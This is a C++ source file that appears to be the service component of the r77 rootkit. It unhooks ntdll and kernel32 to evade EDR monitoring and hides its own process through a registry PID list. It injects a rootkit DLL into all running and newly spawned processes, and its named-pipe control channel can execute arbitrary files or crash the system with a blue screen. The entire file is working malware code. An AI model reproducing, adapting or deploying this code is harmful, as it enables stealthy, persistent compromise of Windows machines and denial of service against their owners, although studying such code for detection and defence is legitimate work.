#include "InstallService.h"

int CALLBACK WinMain(HINSTANCE instance, HINSTANCE previousInstance, LPSTR commandLine, int cmdShow)
{
	// Unhook DLL's that are monitored by EDR.
	UnhookDll(L"ntdll.dll");
	if (IsWindows10OrGreater() || sizeof(LPVOID) == 8)
	{
		// Unhooking kernel32.dll on Windows 7 x86 fails.
		//TODO: Find out why unhooking kernel32.dll on Windows 7 x86 fails.
		UnhookDll(L"kernel32.dll");
	}

	InitializeApi(INITIALIZE_API_SRAND | INITIALIZE_API_DEBUG_PRIVILEGE);

	// Get r77 DLL.
	if (!GetResource(IDR_R77, "DLL", &Dll, &DllSize)) return 0;

	// Terminate already running r77 service processes of the same bitness as the current process.
	TerminateR77Service(GetCurrentProcessId());

	// Create HKEY_LOCAL_MACHINE\SOFTWARE\$77config and set DACL to allow full access by any user.
	HKEY configKey;
	if (InstallR77Config(&configKey))
	{
		// Write current process ID to the list of hidden PID's.
		// Since this process is created using process hollowing (dllhost.exe), the name cannot begin with "$77".
		// Therefore, process hiding by PID must be used.
		HKEY pidKey;
		if (RegCreateKeyExW(configKey, L"pid", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, &pidKey, NULL) == ERROR_SUCCESS)
		{
			// The registry values "svc32" and "svc64" are reserved for the r77 service.
			DWORD processId = GetCurrentProcessId();
			RegSetValueExW(pidKey, sizeof(LPVOID) == 4 ? L"svc32" : L"svc64", 0, REG_DWORD, (LPBYTE)&processId, sizeof(DWORD));
			RegCloseKey(pidKey);
		}

		RegCloseKey(configKey);
	}

	// When the NtResumeThread hook is called, the r77 service is notified through a named pipe connection.
	// This will trigger the following callback and the child process is injected.
	// After it's injected, NtResumeThread is executed in the parent process.
	// This way, r77 is injected before the first instruction is run in the child process.
	ChildProcessListener(ChildProcessCallback);

	// In addition, check for new processes every 100 ms that might have been missed by child process hooking.
	// This is particularly the case for child processes of protected processes (such as services.exe), because protected processes cannot be injected.
	// In the first iteration, the callback is invoked for every currently running process, making this the initial injection into all processes.
	NewProcessListener(100, NewProcessCallback);

	// Open a named pipe to receive commands from any process.
	// Processes should send commands to the 32-bit r77 service. Commands that require to be handled by the 64-bit r77 service are internally redirected using a second named pipe.
	ControlPipeListener(ControlCallback);

	// There are no implications when injecting a process twice.
	// If the R77_SIGNATURE is already present in the target process, the r77 DLL will just unload itself.

	// Perform startup of custom files, only in the 32-bit service to not perform startup twice.
	if (sizeof(LPVOID) == 4)
	{
		PR77_CONFIG config = LoadR77Config();

		for (int i = 0; i < config->StartupFiles->Count; i++)
		{
			ShellExecuteW(NULL, L"open", config->StartupFiles->Values[i], NULL, NULL, SW_SHOW);
		}

		DeleteR77Config(config);
	}

	while (true)
	{
		Sleep(100);
	}

	return 0;
}
VOID ChildProcessCallback(DWORD processId)
{
	// Hook the newly created child processes before it is actually started.
	// After this function returns, the original NtResumeThread is called.

	if (!IsInjectionPaused)
	{
		InjectDll(processId, Dll, DllSize, FALSE);
	}
}
VOID NewProcessCallback(DWORD processId)
{
	// Hook new processes that might have been missed by child process hooking.
	if (!IsInjectionPaused)
	{
		InjectDll(processId, Dll, DllSize, TRUE);
	}
}
VOID ControlCallback(DWORD controlCode, HANDLE pipe)
{
	// The r77 service received a command from another process.
	// If the current instance of the r77 service is 32-bit, but the command must be handled by the
	// 64-bit r77 service, the command is redirected automatically.

	switch (controlCode)
	{
		case CONTROL_R77_TERMINATE_SERVICE:
		{
			if (sizeof(LPVOID) == 4)
			{
				RedirectCommand64(&controlCode, sizeof(DWORD));
			}

			ExitProcess(0);
			break;
		}
		case CONTROL_R77_UNINSTALL:
		{
			if (sizeof(LPVOID) == 4)
			{
				RedirectCommand64(&controlCode, sizeof(DWORD));
			}

			HKEY key;
			if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_ALL_ACCESS | (sizeof(LPVOID) == 4 ? KEY_WOW64_32KEY : KEY_WOW64_64KEY), &key) == ERROR_SUCCESS)
			{
				RegDeleteValueW(key, HIDE_PREFIX L"stager");
			}

			DeleteScheduledTask(sizeof(LPVOID) == 4 ? R77_SERVICE_NAME32 : R77_SERVICE_NAME64);
			DetachAllInjectedProcesses();
			UninstallR77Config();
			TerminateR77Service(-1);
			break;
		}
		case CONTROL_R77_PAUSE_INJECTION:
		{
			if (sizeof(LPVOID) == 4)
			{
				RedirectCommand64(&controlCode, sizeof(DWORD));
			}

			IsInjectionPaused = TRUE;
			break;
		}
		case CONTROL_R77_RESUME_INJECTION:
		{
			if (sizeof(LPVOID) == 4)
			{
				RedirectCommand64(&controlCode, sizeof(DWORD));
			}

			IsInjectionPaused = FALSE;
			break;
		}
		case CONTROL_PROCESSES_INJECT:
		{
			DWORD processId;
			DWORD bytesRead;
			if (ReadFile(pipe, &processId, sizeof(DWORD), &bytesRead, NULL) && bytesRead == sizeof(DWORD))
			{
				// The 32-bit r77 service injects 32-bit processes
				// The 64-bit r77 service injects 64-bit processes
				BOOL is64Bit;
				if (Is64BitProcess(processId, &is64Bit))
				{
					if (is64Bit == (sizeof(LPVOID) == 8))
					{
						InjectDll(processId, Dll, DllSize, TRUE);
					}
					else
					{
						DWORD data[] = { controlCode, processId };
						RedirectCommand64(data, sizeof(data));
					}
				}
			}

			break;
		}
		case CONTROL_PROCESSES_INJECT_ALL:
		{
			if (sizeof(LPVOID) == 4)
			{
				RedirectCommand64(&controlCode, sizeof(DWORD));
			}

			LPDWORD processes = new DWORD[10000];
			DWORD processCount = 0;
			if (EnumProcesses(processes, sizeof(DWORD) * 10000, &processCount))
			{
				processCount /= sizeof(DWORD);

				for (DWORD i = 0; i < processCount; i++)
				{
					InjectDll(processes[i], Dll, DllSize, TRUE);
				}
			}
			break;
		}
		case CONTROL_PROCESSES_DETACH:
		{
			DWORD processId;
			DWORD bytesRead;
			if (ReadFile(pipe, &processId, sizeof(DWORD), &bytesRead, NULL) && bytesRead == sizeof(DWORD))
			{
				// The 32-bit r77 service detaches 32-bit processes
				// The 64-bit r77 service detaches 64-bit processes
				BOOL is64Bit;
				if (Is64BitProcess(processId, &is64Bit))
				{
					if (is64Bit == (sizeof(LPVOID) == 8))
					{
						DetachInjectedProcess(processId);
					}
					else
					{
						DWORD data[] = { controlCode, processId };
						RedirectCommand64(data, sizeof(data));
					}
				}
			}

			break;
		}
		case CONTROL_PROCESSES_DETACH_ALL:
		{
			if (sizeof(LPVOID) == 4)
			{
				RedirectCommand64(&controlCode, sizeof(DWORD));
			}

			DetachAllInjectedProcesses();
			break;
		}
		case CONTROL_USER_SHELLEXEC:
		{
			WCHAR file[MAX_PATH + 1];
			WCHAR commandLine[MAX_PATH + 1];

			if (ReadFileStringW(pipe, file, MAX_PATH + 1) &&
				ReadFileStringW(pipe, commandLine, MAX_PATH + 1))
			{
				ShellExecuteW(NULL, L"open", file, commandLine, NULL, SW_SHOW);
			}
			break;
		}
		case CONTROL_SYSTEM_BSOD:
		{
			BOOLEAN previousValue = FALSE;
			nt::RtlAdjustPrivilege(20, TRUE, FALSE, &previousValue);

			BOOLEAN oldIsCritical = FALSE;
			nt::RtlSetProcessIsCritical(TRUE, &oldIsCritical, FALSE);

			ExitProcess(0);
			break;
		}
	}
}
VOID RedirectCommand64(LPVOID data, DWORD size)
{
	HANDLE pipe64 = CreateFileW(CONTROL_PIPE_REDIRECT64_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (pipe64 != INVALID_HANDLE_VALUE)
	{
		DWORD bytesWritten;
		WriteFile(pipe64, data, size, &bytesWritten, NULL);
		CloseHandle(pipe64);
	}
}